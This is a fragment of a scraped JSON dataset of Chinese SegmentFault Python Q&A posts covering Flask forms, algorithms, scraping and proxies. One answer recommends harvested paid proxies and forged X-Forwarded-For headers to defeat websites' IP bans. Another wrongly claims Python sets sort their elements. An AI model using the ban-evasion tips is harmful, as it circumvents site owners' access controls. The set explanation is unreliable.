      "dsc": "<div class=\"question fmt\" data-id=\"1010000000130584\">\n<p>Flask-WTF在编辑一个记录的时候，遇到下拉菜单如何自动跳到数据默认的选项上？</p><p>现在遇到一个问题就是编辑一个记录的时候，从数据库里读出来的数据在前台不能同步。QuerySelectField总是显示第一条记录.也就是说。并没有根据数据库的值自动同步选项。</p><pre>Model:\nclass Article(db.Model):\n    id=db.Column(db.Integer,primary_key=True)\n    node=db.Column(db.Integer,db.ForeignKey(\"node.id\"), nullable=False, index=True, )\n    title=db.Column(db.Unicode(200))\n    content=db.Column(db.Text)\n    created = db.Column(db.DateTime, default=datetime.now)\n    _tags=db.Column(db.Unicode(200),index=True)\n    hits = db.Column(db.Integer, default=1)\n\n\nclass Node(db.Model):\n    id=db.Column(db.Integer,primary_key=True)\n    name=db.Column(db.String(200),nullable=False)\n    slug = db.Column(db.String(200), nullable=False, index=True, unique=True)\n\n\n==============\nForm的定义：\nclass ArticleForm(Form):\n    title=TextField(\"title\")\n    content=TextAreaField(\"content\")\n    node=QuerySelectField(\"node\",query_factory=lambda :Node.query.all(),get_pk=lambda x:x.id,get_label=lambda x:x.name)\n    tags = TextField(\"Tags\")\n    submit = SubmitField(u\"提交\")\n\n==============\nview:\ndef editarticle(article_id):\n    art=Article.query.filter(Article.id==article_id).first_or_404()\n    form=ArticleForm(obj=art)\n    if form.validate_on_submit():\n        form.populate_obj(art)\n        art.node=form.node.data.id\n        db.session.add(art)\n        db.session.commit()\n        return redirect(url_for(\".listarticle\"))\n    return render_template(\"/admin/create_article.html\",form=form)</pre><p>请问我应该如何做，才能在编辑一个ariticle的时候，Node这个字段的下拉菜单自动显示artilce数据库里的相应的情况？</p>\n</div>",
      "favourite": "0",
      "glance": "4k",
      "tags": [
        "flask",
        "python"
      ],
      "time": "2012-10-21",
      "title": "Flask-WTF在编辑一个记录的时候，下拉菜单如何同步？",
      "url": "https://segmentfault.com/q/1010000000130584"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000131072\">\n<p>php的__call函数方法，用在类里可以捕获所有未定义方法的调用。请问在python中有什么方法能实现同类功能。多谢。</p>\n</div>",
      "favourite": "1",
      "glance": "2.2k",
      "tags": [
        "python",
        "php"
      ],
      "time": "2012-10-23",
      "title": "python如何实现php的 __call函数实现的功能？",
      "url": "https://segmentfault.com/q/1010000000131072"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000131613\">\n<p>具体的实现:</p><pre>s = 'qwerty'\n\nk = {}.fromkeys(s[0:-1], 0)\n\ndef foo(a, b):\n\tif b == len(a):\n\t\tfor p, q in zip(s, a+[0]):\n\t\t\tprint p, \n\t\t\tif q:\n\t\t\t\tprint '.', \n\t\tprint ''\n\telse:\n\t\ta[b] = 1\n\t\tfoo(a, b+1)\n\t\ta[b] = 0\n\t\tfoo(a, b+1)\n\nfoo(k.values(), 0)</pre><p>如果你想看下实现原理: 我这里有个C版的,更清楚些:</p><p><a href=\"http://hit9.org/blog/Data_Structures_Qs/posts/index.html\" rel=\"nofollow\" target=\"_blank\" title=\"http://hit9.org/blog/Data_Structures_...\">http://hit9.org/blog/Data_Structures_...</a>  的第2题</p><p>--------------- 10-25更新-----------</p><p>好吧.比较简短的版本来了:</p><p>下面的属于比较'不那么麻烦的做法'~  用了itertools模块:</p><pre>from  itertools import product\ns = 'qwerty'\nfor i in product(*(([1, 0], )*(len(s)-1))):\n\tfor p, q in zip(s, list(i)+[0]):\n\t\tprint p, '.' if q else '', \n\tprint ''</pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000131773\">\n<p>来个5行简单版</p><pre>def add_dots(s):\n    r = [s[:i] + '.' + s[i:] for i in range(1, len(s))]\n    r += [j + '.' + s[i:] for i in range(1, len(s)) for j in add_dots(s[:i])]\n    r += [s[:i] + '.' + j for i in range(1, len(s)) for j in add_dots(s[i:])]\n    return set(r)</pre><p>//效率灰常低，纯属玩玩。。</p><p>p.s. 针对\"abcde\"字符串的排列</p><p>某男的ruby(1.9.x)精简版：</p><pre>p (?b..?e).inject([?a]){|a,q|a.product [q,?.+q]}.map &amp;:join</pre><p>简单地说就是笛卡尔积，至于看不看得懂是另一回事了……（反正我没看太懂，ruby语法太抽象。。）</p><p>某男的C精简版：</p><pre>#define z(a,b) printf(#a\"%s\",(x&gt;&gt;b)&amp;1?\".\":\"\"),\nmain(x){z(a,3)z(b,2)z(c,1)z(d,0)puts(\"e\");16-x&amp;&amp;main(x+1);}</pre><p>与hit9同学协力完成了个（易读易写的）</p><pre>from itertools import product\n[''.join(i + j for i, j in zip('abcd', p)) + 'e' for p in product(['.', ''], repeat = 4)]</pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000131585\">\n<p>楼主 这个问题其实不难，首先肯定的是“点”是存在于两个字母之间的 ，那么你就想象有n个“位置”在n+1个字母之间，每一个“位置”有两个状态，一个是存在“点”，一个是不存在“点”，都不存在的情况被排除掉了，所以本题的核心是求集合的非空子集。所有的可能性的个数为 2^n - 1</p><p>假设 字符串为qwer，那么有三个“位置”，我们把这个三个“位置”分别命名为a,b,c<br/>\n那个通过循环和二进制位的判断可以得出所有的结果<br/>\n楼主静下心来看看下面的结果，悟一下，算法的复杂度还是蛮低的<br/>\nindex从 1 到 2^n-1 （&lt;=） 循环，每一步判断当前index中二进制位为1对应的位，然后将\"点\"放到相应的位置，下面的例子当到2^3-1也就是7的时候，三个“位置”上都放上了“点”</p><pre>c   b   a   \n0   0   1      qwe.r \n0   1   0      qw.er\n0   1   1      qw.e.r\n1   0   0      q.wer\n1   0   1      q.we.r\n1   1   0      q.w.er\n1   1   1      q.w.e.r</pre><p>我自己之前写过一个SKU相关的算法，其实本质和这个问题是一样的，可以参见 <a href=\"http://geeklu.com/2012/09/sku/\" rel=\"nofollow\" target=\"_blank\" title=\"http://geeklu.com/2012/09/sku/\">http://geeklu.com/2012/09/sku/</a></p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000131575\">\n<p>罗列出<code>qwerty</code>被<code>.</code>分割的所有情况：</p><pre>q.werty\nq.w.erty\nqw.erty\n...\nq.w.e.r.t.y</pre>\n</div>",
      "favourite": "5",
      "glance": "10k",
      "tags": [
        "python",
        "算法"
      ],
      "time": "2012-10-24",
      "title": "求一则算法（python）",
      "url": "https://segmentfault.com/q/1010000000131575"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000132650\">\n<p><code>author = HiddenField('作者',default='123')</code></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000427109\">\n<p>form = SomeForm(author='123')</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000132887\">\n<p>实际测试了下， wtform-1.0.2 中，HiddenField 的 default 值并不能给 value 赋值。</p><p>以下2种方式测试可以</p><p>1、在template 文件中赋值</p><pre>{{ form.author(value='123') }}</pre><p>2、在handler 处理中赋值</p><pre>form.author.data = '123'</pre>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000132532\">\n<p>比如，我当前的页面网址是<code>author/123</code><br/>\n该页面有个表单，我希望包含一个这样的</p><pre>&lt;input type=\"hidden\" name=\"author\" value=\"123\" /&gt;</pre><p>于是，我用WTForms中做了下面的定义</p><pre>author = HiddenField('作者')</pre><p>上面这个代码输出的<code>value=\"\"</code>，我该如何把这个<code>123</code>赋值进去呢？<br/>\n官方的文档看得不太懂 <a href=\"http://wtforms.simplecodes.com/docs/1.0.2/fields.html#wtforms.fields.HiddenField\" rel=\"nofollow\" target=\"_blank\" title=\"http://wtforms.simplecodes.com/docs/1...\">http://wtforms.simplecodes.com/docs/1...</a></p>\n</div>",
      "favourite": "1",
      "glance": "4.6k",
      "tags": [
        "python",
        "wtforms",
        "flask"
      ],
      "time": "2012-10-27",
      "title": "WTForms如何给表单初始化默认值",
      "url": "https://segmentfault.com/q/1010000000132532"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000144071\">\n<p>基于webkit的<a href=\"http://phantomjs.org/\" rel=\"nofollow\" target=\"_blank\" title=\"http://phantomjs.org/\">http://phantomjs.org/</a>，写js就行。<br/>\n用python调它，用起来很爽。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000143395\">\n<p>对于JS生成的数据，你是没有办法获取的。除非直接遍历dom还是有可能……</p><p>一种办法是可以考虑用userscript，获取数据然后post到服务器等就随你自己的喜欢了</p><p>还有一种办法（假设是在win32），可以使用com组件调用IE然后获取动态生成的dom树，然后再做处理</p><p>当年试过改firefox的程序来做这个，不过也很麻烦</p><p>当然，你也可以用python什么自己实现一套浏览器和js引擎，那么这些数据肯定是你自己的了，不过还不如直接改或者用com组件</p><p>但是你说的爬虫爬取js生成的，那是没有办法的：（不管怎么样，一定要实现dom树，要让js能执行，那么就相当于你要实现一套简单的浏览器了</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000143650\">\n<p>如果对抓取的性能没有什么要求的话, 尝试一下selenium或者watir吧.<br/>\nweb自动化测试脚本用好了可以做很多事情.<br/>\n利用你的浏览器执行好js, 然后再从dom里面取数据.</p><p>另外一个情况, 如果你知道js是通过ajax或者api取数据的, 直接去抓数据源, 得到的不是json就是xml, 然后处理数据吧</p>\n</div>",
      "attention": "8",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000143340\">\n<p>想写一个爬虫,但是需要抓去的的数据是js生成的,在源代码里看不到,要怎么才能抓到呢? 最好是用python</p>\n</div>",
      "favourite": "24",
      "glance": "29.8k",
      "tags": [
        "网页爬虫",
        "python"
      ],
      "time": "2012-11-22",
      "title": "如何用python抓取js生成的数据",
      "url": "https://segmentfault.com/q/1010000000143340"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000145373\">\n<p>Linux下有pyinotify，Windows下是否有类似的基于事件的文件监控方案？</p>\n</div>",
      "favourite": "3",
      "glance": "6.1k",
      "tags": [
        "python",
        "文件监控",
        "inotify"
      ],
      "time": "2012-11-27",
      "title": "如何在Windows下使用Python监控文件变动",
      "url": "https://segmentfault.com/q/1010000000145373"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000150722\">\n<p>如果服务端没有要求...node比较好点吧..</p><p>socket.io..多种方案,也支持多种浏览器</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000150733\">\n<p>到现在为止的成熟方案似乎包括tornado, node, erlang, 另外不知道go实现的怎么样, python里面还有一堆gevent, greenlet可以用, twisted也可以考虑. PHP多线程或多进程就别想了.</p><p>在产品级别, 已知的比如 www.quora.com 是tornado, gtalk不知道如何实现, 可能是java?<br/>\nmochimedia应该比较erlang<br/>\n国内的腾讯阿里什么的就更不知道了, 他们都有做web chat的, zhihu.com也是tornado</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000150704\">\n<p>这个需求跟在线聊天类似</p><ul><li>ajax频繁请求</li></ul><ul><li>长轮询</li></ul><p>可以看看这篇[文章](<a href=\"http://blog.leezhong.com/tech/2011/03/21/php-comet.html\" rel=\"nofollow\" target=\"_blank\" title=\"http://blog.leezhong.com/tech/2011/03...\">http://blog.leezhong.com/tech/2011/03...</a>)</p><ul><li>websocket (开源swf库可以解决低版本浏览器的兼容,swf需要服务器端的一个授权)</li></ul><p>swf开源库：[<a href=\"https://github.com/gimite/web-socket-js\" rel=\"nofollow\" target=\"_blank\" title=\"https://github.com/gimite/web-socket-...\">https://github.com/gimite/web-socket-...</a>](<a href=\"https://github.com/gimite/web-socket-js\" rel=\"nofollow\" target=\"_blank\" title=\"https://github.com/gimite/web-socket-...\">https://github.com/gimite/web-socket-...</a>)<br/>\n这里我写了段简单的服务器端授权[代码](<a href=\"https://github.com/xiaozi/PolicyServer/\" rel=\"nofollow\" target=\"_blank\" title=\"https://github.com/xiaozi/PolicyServe...\">https://github.com/xiaozi/PolicyServe...</a>)</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000150643\">\n<p>比如，实现一块区域专门进行最新留言的展示.. 每次有最新的留言就把它显示在上面..<br/>\n(比如人人影视右下角的“精彩评论”, 不知道是不是实时的)</p><p>再比如，做一个网站，抓取其他网站上的信息，比如租房价格。<br/>\n但是其他网站上的租房价格的更新并不是定时的。</p><p>对于这些实时更新的需求? 有什么思路可以完成？</p>\n</div>",
      "favourite": "11",
      "glance": "3.1k",
      "tags": [
        "数据库",
        "php",
        "python"
      ],
      "time": "2012-12-11",
      "title": "实时数据更新有什么思路可以完成？",
      "url": "https://segmentfault.com/q/1010000000150643"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000160563\">\n<p>最近在看 <a href=\"http://book.douban.com/subject/4866934/\" rel=\"nofollow\" target=\"_blank\" title=\"http://book.douban.com/subject/486693...\">http://book.douban.com/subject/486693...</a>这本书。看到第二章分片赋值的时候不是很理解，google之后，也没得到想要的答案，</p><p>故想问，python 分片赋值 想求个详细的讲解，愿前辈帮个小忙。</p>\n</div>",
      "favourite": "4",
      "glance": "4.1k",
      "tags": [
        "python"
      ],
      "time": "2013-01-14",
      "title": "关于 python 分片赋值",
      "url": "https://segmentfault.com/q/1010000000160563"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000164000\">\n<p>可以查看源码看具体区别。<br/>\n在python的C语言实现版本，获取repr时会调用：</p>\n<pre><code class=\"lang-cpp\">static PyObject *\nstring_repr(PyObject *op)\n{\n    return PyString_Repr(op, 1);\n}\n</code></pre>\n<p>它调用的<code>PyString_Repr</code>函数代码如下：</p>\n<pre><code>PyObject *\nPyString_Repr(PyObject *obj, int smartquotes)\n{\n    register PyStringObject* op = (PyStringObject*) obj;\n    size_t newsize = 2 + 4 * Py_SIZE(op);\n    PyObject *v;\n    if (newsize &gt; PY_SSIZE_T_MAX || newsize / 4 != Py_SIZE(op)) {\n        PyErr_SetString(PyExc_OverflowError,\n            \"string is too large to make repr\");\n        return NULL;\n    }\n    v = PyString_FromStringAndSize((char *)NULL, newsize);\n    if (v == NULL) {\n        return NULL;\n    }\n    else {\n        register Py_ssize_t i;\n        register char c;\n        register char *p;\n        int quote;\n\n        /* figure out which quote to use; single is preferred */\n        quote = '\\'';\n        if (smartquotes &amp;&amp;\n            memchr(op-&gt;ob_sval, '\\'', Py_SIZE(op)) &amp;&amp;\n            !memchr(op-&gt;ob_sval, '\"', Py_SIZE(op)))\n            quote = '\"';\n\n        p = PyString_AS_STRING(v);\n        *p++ = quote;\n        for (i = 0; i &lt; Py_SIZE(op); i++) {\n            /* There's at least enough room for a hex escape\n               and a closing quote. */\n            assert(newsize - (p - PyString_AS_STRING(v)) &gt;= 5);\n            c = op-&gt;ob_sval[i];\n            if (c == quote || c == '\\\\')\n                *p++ = '\\\\', *p++ = c;\n            else if (c == '\\t')\n                *p++ = '\\\\', *p++ = 't';\n            else if (c == '\\n')\n                *p++ = '\\\\', *p++ = 'n';\n            else if (c == '\\r')\n                *p++ = '\\\\', *p++ = 'r';\n            else if (c &lt; ' ' || c &gt;= 0x7f) {\n                /* For performance, we don't want to call\n                   PyOS_snprintf here (extra layers of\n                   function call). */\n                sprintf(p, \"\\\\x%02x\", c &amp; 0xff);\n                p += 4;\n            }\n            else\n                *p++ = c;\n        }\n        assert(newsize - (p - PyString_AS_STRING(v)) &gt;= 1);\n        *p++ = quote;\n        *p = '\\0';\n        if (_PyString_Resize(&amp;v, (p - PyString_AS_STRING(v))))\n            return NULL;\n        return v;\n    }\n}\n</code></pre>\n<p>实际上repr对象就是一个string对象，对应python代码<code>repr(\"a string\").__class__</code>返回的<code>&lt;type 'str'&gt;</code>也说明了这一点。<br/>\n仔细看看源码可以发现，创建repr对象时需要传入string对象，而且repr对象的大小（占用内存空间）是string的4倍，其主要目的就是进行一些字符串格式化，如代码所见，repr将<code>\\</code>,<code>\"</code>,<code>\\t</code>等字符格式化成<code>\\\\</code>,<code>\\\"</code>,<code>\\\\t</code>等。<br/>\n简而言之，repr就是对string的一个格式化处理，即，返回的是一个格式化处理过的string（新对象）。<br/>\n对应你的代码：</p>\n<pre><code>print \"It write: %s.\" % q\nprint \"It write: %r.\" % q\n</code></pre>\n<p>第一行将打印string对象q，第二行打印被repr处理后的string对象（非q）。<br/>\n具体的打印显示实现可看源码，函数原型是：<code>static int string_print(PyStringObject *op, FILE *fp, int flags)</code></p>\n<p>上述的解释是字符串的默认实现，当然你也可以使用magic method：<code>__repr__</code>,<code>__str__</code>重载它们</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000163937\">\n<p>s意义是字符串<br/>\nr意义是使用repr,而不是str<br/>\n%r 用来做 debug 比较好，因为它会显示变量的原始数据（raw data），而其它的符号则是用来向用户显示输出的。在《笨办法学习Python(第三版)》中有详细说明<br/>\n比如</p><pre>&gt;&gt;&gt; print '%s, %s'%('one', 'two')\none, two\n&gt;&gt;&gt; print '%r, %r'%('one', 'two')\n'one', 'two'</pre><p>个人习惯还是喜欢用format方法</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000163924\">\n<p>%r是repr<br/>\n%s就是str</p><pre>比如\\x27是单引号\n\n&gt;&gt;&gt; print '%r'%'\\x27' # 带括号的单引号\n\"'\" \n&gt;&gt;&gt; print '%s'%'\\x27' # 纯单引号\n'\n&gt;&gt;&gt; class Example(object): \n...     __repr__ = lambda cls: '&lt;Demo&gt;(repr)'\n...     __str__  = lambda cls: '&lt;Demo&gt;(str)'\n... \n&gt;&gt;&gt; example = Example()\n&gt;&gt;&gt; print '%s'%example\n&lt;Demo&gt;(str)\n&gt;&gt;&gt; print '%r'%example\n&lt;Demo&gt;(repr)</pre>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000163896\">\n<p>看代码的时候一头雾水，不清楚什么情况下使用：</p><pre>print \"It write: %s.\" % q\nprint \"It write: %r.\" % q</pre><p>这二者有什么区别吗？</p>\n</div>",
      "favourite": "3",
      "glance": "18k",
      "tags": [
        "python"
      ],
      "time": "2013-01-22",
      "title": "python什么情况下用 %r，什么情况下用 %s？",
      "url": "https://segmentfault.com/q/1010000000163896"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000164393\">\n<p>找了flask的文档，但是没有找到。</p>\n</div>",
      "favourite": "1",
      "glance": "3.5k",
      "tags": [
        "python",
        "flask"
      ],
      "time": "2013-01-23",
      "title": "Flask怎样获得访客的 user agent",
      "url": "https://segmentfault.com/q/1010000000164393"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000168965\">\n<p><a href=\"https://travis-ci.org/\" rel=\"nofollow\" target=\"_blank\" title=\"https://travis-ci.org/\">https://travis-ci.org/</a></p><p>它家好像还没出private build的功能，不过如果是开源开发可以试试</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000176633\">\n<p><a href=\"http://trac.buildbot.net/\" rel=\"nofollow\" target=\"_blank\" title=\"buildbot\">buildbot</a></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000397650\">\n<p>python CI  请参考   <a href=\"http://docs.python-guide.org/en/latest/scenarios/ci\" rel=\"nofollow\">http://docs.python-guide.org/en/latest/scenarios/ci</a></p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000166282\">\n<p>以前做Java项目用过<a href=\"http://cruisecontrol.sourceforge.net/\" rel=\"nofollow\" target=\"_blank\" title=\"CruiseControl\">CruiseControl</a>和<a href=\"http://www.atlassian.com/software/bamboo/\" rel=\"nofollow\" target=\"_blank\" title=\"Bamboo\">Bamboo</a>，但是貌似只能用于Java项目的持续集成（？其实这些持续集成工具的网站上并没有明确说支持哪些语言写的项目，只是构建工具都是Ant和maven，所以我也不确定）。</p><p>不知道Python项目适合用哪个持续集成工具，如果还能提供推荐工具的使用体验就更好了：）</p>\n</div>",
      "favourite": "2",
      "glance": "5.2k",
      "tags": [
        "python",
        "持续集成"
      ],
      "time": "2013-01-28",
      "title": "适合Python项目的持续集成环境有那些？",
      "url": "https://segmentfault.com/q/1010000000166282"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000172296\">\n<p>(1) 我觉得解决这个问题的终极办法是写出不让人讨厌的爬虫；<br/>\n(2) 代理也分很多种，有的可以完全隐藏你的源IP，有的不可以，所以不要指望代理可以解决你的所有问题，而且，免费的代理基本是不可能隐藏你的源IP的；<br/>\n(3) 或者，你可以更改系统底层TCPIP实现，在网络层动手脚。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000172706\">\n<p>现在网上付费的代理很多，价格都很便宜，比用免费的好多了，当时我买的大概不到1分钱一个吧。我当时花了几十块钱，基本上就扛了一两个月的爬虫使用。<br/>\n因为卖代理的也是通过各种渠道去抓的一些http代理，成本几乎为0。<br/>\n当时买代理那个网站好像已经被关了，他们做得还比较好，还提供http接口取代理ip，还可以选择代理的地点，类型等等，非常方便。<br/>\n据我当时的经验，这些代理也都还可以。程序支持curl的话，直接设置代理就行了。如果再完善一点，就把 X-FORWORD-FOR等类似的能够溯源的HTTP头也人为设置一下。基本上封IP这一套就对你没用了。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000172604\">\n<p>考虑一下几点建议：<br/>\n1.使用VPN，这样就完全保证了你的出口IP地址是VPN服务器端的IP。<br/>\n2.使用HTTP代理，具体代码可以都可以设置代理方式，不要使用免费代理，不可靠，自己用VPS来搭建或者自己写，我个人就是自己用Node.js写的代理服务器在美国<br/>\n3.爬虫抓取过程中请遵循robot协议，这是默认的业界标准</p>\n</div>",
      "attention": "9",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000170097\">\n<p>写爬虫爬网站内容时遇到ip被封，请问如何使用代理？<br/>\n用了网上搜到的<a href=\"http://www.cnproxy.com/\" rel=\"nofollow\" target=\"_blank\" title=\"http://www.cnproxy.com/\">http://www.cnproxy.com/</a> 代理服务器中的ip和端口，没有一个可以用的。。。<br/>\n请高手帮忙。小弟多谢</p>\n</div>",
      "favourite": "7",
      "glance": "16.4k",
      "tags": [
        "python",
        "网页爬虫"
      ],
      "time": "2013-02-06",
      "title": "写爬虫爬网站内容时遇到ip被封，请问如何使用代理？",
      "url": "https://segmentfault.com/q/1010000000170097"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000172929\">\n<p>说下自己的理解<br/>\n楼主定义了二个set , 分别为 params1、params2，如下：</p><pre>params1 = {'python', 'language'}\nparams2 = {'language', 'python'}</pre><p>打印params1、params2，结果显示：</p><pre>set(['python', 'language'])\nset(['python', 'language'])</pre><p>发现他们存储的顺序已经改变，所以猜测set数据结构会将其中的元素排序。</p><p>所有的秘密都藏在源码里，所有我们翻看一下set的实现代码，查看Python安装目录下的Lib/sets.py文件，可以看到Set的定义</p><pre>class Set(BaseSet):\n    \"\"\" Mutable set class.\"\"\"\n\n    __slots__ = []\n\n    # BaseSet + operations requiring mutability; no hashing\n\n    def __init__(self, iterable=None):\n        \"\"\"Construct a set from an optional iterable.\"\"\"\n        self._data = {}\n        if iterable is not None:\n            self._update(iterable)\n.\n.\n.</pre><p>可以发现元素是存在 _data[] 里 ， 我们再查看一下它的插入元素函数</p><pre>    def add(self, element):\n        \"\"\"Add an element to a set.\n\n        This has no effect if the element is already present.\n        \"\"\"\n        try:\n            self._data[element] = True\n        except TypeError:\n            transform = getattr(element, \"__as_immutable__\", None)\n            if transform is None:\n                raise # re-raise the TypeError exception we caught\n            self._data[transform()] = True</pre><p>可以看到，插入元素element时，是将_data[element]设为True。<br/>\n所以元素的顺序就和map中定义的小于号有关。</p><p>所以 ， 下面的代码输出结果一样</p><pre>print story(*params1)\nprint story(*params2)</pre><p>望指正</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000172797\">\n<p>你的函数没有返回值，干嘛用print story(),这样肯定就是None了，直接story()不就行了吗？</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000172769\">\n<pre>print params1\nprint params2</pre><p>你看看他们的输出是怎样的:</p><pre>set(['python', 'language'])\nset(['python', 'language'])</pre>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000172763\">\n<p>这段代码为什么输出的结果是这样的？</p><pre>def story(name, job):\n    print 'name --&gt;',name,'job --&gt;',job\n\nparams1 = {'python', 'language'}\nparams2 = {'language', 'python'}\nprint story(*params1)\nprint story(*params2)</pre><p>结果：</p><pre>name --&gt; python job --&gt; language\nNone\nname --&gt; python job --&gt; language\nNone</pre><p>唔，输出None的问题我明白了。</p>\n</div>",
      "favourite": "3",
      "glance": "2.4k",
      "tags": [
        "python"
      ],
      "time": "2013-02-23",
      "title": "初学python的一个小问题不解",
      "url": "https://segmentfault.com/q/1010000000172763"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000175058\">\n<p>第一个例子中 data 是固定的，因此 id(data) 是固定的。原因请参考<a href=\"http://docs.python.org/3/tutorial/controlflow.html#defining-functions\" rel=\"nofollow\" target=\"_blank\" title=\"官方文档\">官方文档</a>第4.7.1节最后的Important warning。</p><p>第二个例子中每次 value 都是一个新的 list，因此每次 id(value) 都不一样。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000175097\">\n<p>在参数列表里的值只计算一次，实际上<strong>每次赋给data的是最初创建的[]对象的引用</strong>。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000175088\">\n<p>默认参数只被计算一次。</p><p>上者是修改，下者是赋值，不一样：一个是对一个对象操作，一个是更替对象！</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000175038\">\n<p>看<a href=\"http://effbot.org/zone/default-values.htm\" rel=\"nofollow\" target=\"_blank\" title=\"Default Parameter Values in Python\">Default Parameter Values in Python</a>这篇文章时， 下面示例：</p><pre>&gt;&gt;&gt; def function(data=[]):\n...     data.append(1)\n...     return data\n... \n&gt;&gt;&gt; function()\n[1]\n&gt;&gt;&gt; function()\n[1, 1]\n&gt;&gt;&gt; function()\n[1, 1, 1]\n&gt;&gt;&gt; id(function())\n3076744140L\n&gt;&gt;&gt; id(function())\n3076744140L</pre><p>说明python实际上是先把默认参数的值计算出来,以后每次调用都是用以前计算出的值.  这里每次function调用使用同一个data, 这里的data是可变对象, 因此data的值不断append.</p><p>那么下面的例子：</p><pre>&gt;&gt;&gt; def myfunc(value=None):\n...     if(value is None):\n...             value=[]\n...     value.append(5)\n...     return value\n... \n&gt;&gt;&gt; myfunc()\n[5]\n&gt;&gt;&gt; myfunc()\n[5]\n&gt;&gt;&gt; id(myfunc())\n3070938636L\n&gt;&gt;&gt; id(myfunc())\n3070938284L\n&gt;&gt;&gt; id(myfunc())\n3070938284L</pre><p>None是一个常量， 是一个不可变对象， 每次调用myfunc()时value都是None，但是id(myfunc())的值为什么不同呢？</p><p>参考：<a href=\"http://blog.rexzhao.com/2011/11/3/python-default-parameter-value.html\" rel=\"nofollow\" target=\"_blank\" title=\"Python的默认参数\">Python的默认参数</a></p>\n</div>",
      "favourite": "3",
      "glance": "2.8k",
      "tags": [
        "python"
      ],
      "time": "2013-03-01",
      "title": "如何理解python中的缺省参数？",
      "url": "https://segmentfault.com/q/1010000000175038"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000175242\">\n<p>用python写一个反向代理，给个简单的示例看看？<br/>\n搜了好久没有搜到。。。<br/>\n===========================================<br/>\n最后还是搜到了。</p><pre>import BaseHTTPServer\nimport hashlib\nimport os\nimport urllib2\n\nclass CacheHandler(BaseHTTPServer.BaseHTTPRequestHandler):\n    def do_GET(self):\n      m = hashlib.md5()\n      m.update(self.path)\n      cache_filename = m.hexdigest()\n      if os.path.exists(cache_filename):\n          print \"Cache hit\"\n          data = open(cache_filename).readlines()\n      else:\n          print \"Cache miss\"\n          data = urllib2.urlopen(\"http://targetserver\" + self.path).readlines()\n          open(cache_filename, 'wb').writelines(data)\n      self.send_response(200)\n      self.end_headers()\n      self.wfile.writelines(data)\n\ndef run():\n    server_address = ('', 8000)\n    httpd = BaseHTTPServer.HTTPServer(server_address, CacheHandler)\n    httpd.serve_forever()\n\nif __name__ == '__main__':\n    run()</pre><p>=============================<br/>\n应该是我描述的不清楚。这个基本上就是我想要的了。<br/>\n<a href=\"http://sharebear.co.uk/blog/2009/09/17/very-simple-python-caching-proxy/\" rel=\"nofollow\" target=\"_blank\" title=\"http://sharebear.co.uk/blog/2009/09/1...\">http://sharebear.co.uk/blog/2009/09/1...</a></p>\n</div>",
      "favourite": "3",
      "glance": "3.5k",
      "tags": [
        "python"
      ],
      "time": "2013-03-02",
      "title": "怎么用python写一个反向代理",
      "url": "https://segmentfault.com/q/1010000000175242"
    },
    {
